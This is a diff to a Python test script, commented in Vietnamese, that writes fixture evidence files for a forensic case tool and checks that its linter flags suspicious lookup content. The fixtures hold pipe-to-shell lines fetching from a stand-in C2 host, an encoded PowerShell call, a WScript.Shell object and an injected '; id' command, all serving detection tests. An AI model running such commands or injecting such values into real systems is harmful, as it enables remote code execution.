@@ -15,7 +15,7 @@ hdr = b'GET https://raw.example.net/x/main\n2026-11-23T00:00:00Z 200\n--- body -
 body = {'ok': b'http://c2.example.net/v2\n', 'ok2': b'c2.example.net\n203.0.113.9\nserver=http://c2.example.net/v2?a=1&b=2\n', 'big': b'a' * (case.LOOKUP_MAX + 1), 'nul': b'abc\0def http://c2.example.net', 'sh': b'#!/bin/sh\necho http://c2.example.net\n',
         'elf': b'\x7fELF http://c2.example.net', 'ctl': bytes([1, 2, 3, 4]) * 20 + b' http://c2.example.net', 'sh2': b'http://c2.example.net\n#!/bin/sh\ncurl x | sh\n', 'ps': b'powershell -enc AAAA http://c2.example.net',
         'b64': b'http://c2.example.net ' + b'QUJD' * 60, 'js': b'<script>x</script> http://c2.example.net', 'pk': b'a\nPK\x03\x04 http://c2.example.net', 'b64ml': (b'QUJD' * 16 + b'\n') * 11, 'b64one': b'QUJD' * 60, 'hex': b'4d5a9000' * 40, 'json': b'{"a": 1, "b": [1, 2]}', 'curl': b'curl http://c2.example.net/p | sh', 'many': b'a.example.net\n' * 21, 'vbs': b'CreateObject("WScript.Shell")'}
-badhead = {'hsh': b'GET https://x.example.net\n#!/bin/sh\ncurl http://c2.example.net/p | sh\n', 'hb64': b'GET https://x.example.net\n' + b'QUJD' * 400 + b'\n', 'hmany': b'GET x\n' * 8, 'hbin': b'GET x\x00\x01\n'}
+badhead = {'hpipe': b'GET x\ncurl http://c2.example.net/p | sh\n', 'hsemi': b'GET x; id\n', 'hsh': b'GET https://x.example.net\n#!/bin/sh\ncurl http://c2.example.net/p | sh\n', 'hb64': b'GET https://x.example.net\n' + b'QUJD' * 400 + b'\n', 'hmany': b'GET x\n' * 8, 'hbin': b'GET x\x00\x01\n'}
 for k, h in badhead.items(): body['h_' + k] = None
 for k, b in body.items():
     open(os.path.join(E, f'lookup_{k}.txt'), 'wb').write((badhead[k[2:]] + SEP + b'http://c2.example.net/v2\n') if b is None else hdr + b)   # đúng định dạng FLOW: đầu + dòng phân cách + thân
@@ -32,3 +32,9 @@ assert {('l.big', 'lookup_content'), ('l.elf', 'lookup_content'), ('l.sh2', 'loo
 open(os.path.join(E, 'lookup_nosep.txt'), 'wb').write(b'#!/bin/sh\n'); case.add(c, id='l.nosep', kind='url', value='http://c2.example.net', src='S', evidence='report/evidence/lookup_nosep.txt')   # không có dòng phân cách: xét cả file
 assert 'lookup_content' in [x['check'] for x in case.lint_fact(c, case.load(c)['l.nosep'])]
 print('OK check_lookup_src (cổng)')
+# tên viết hoa vẫn bị ràng buộc; file CRLF với dòng phân cách đúng vẫn qua
+assert case.src_evidence_issue('E', 'LOOKUP_x.txt') and case.src_evidence_issue('S', 'Lookup_x.txt') is None
+open(os.path.join(E, 'Lookup_crlf.txt'), 'wb').write(b'GET https://x.example.net\r\n2026-11-23T00:00:00Z 200\r\n--- body ---\r\nhttp://c2.example.net/v2\r\n')
+open(os.path.join(E, 'Lookup_bad.txt'), 'wb').write(b'GET x\r\n--- body ---\r\n#!/bin/sh\r\n')
+assert case.lookup_issue('Lookup_crlf.txt', os.path.join(E, 'Lookup_crlf.txt')) is None and case.lookup_issue('Lookup_bad.txt', os.path.join(E, 'Lookup_bad.txt'))
+print('OK check_lookup_src (hoa/thường, CRLF)')
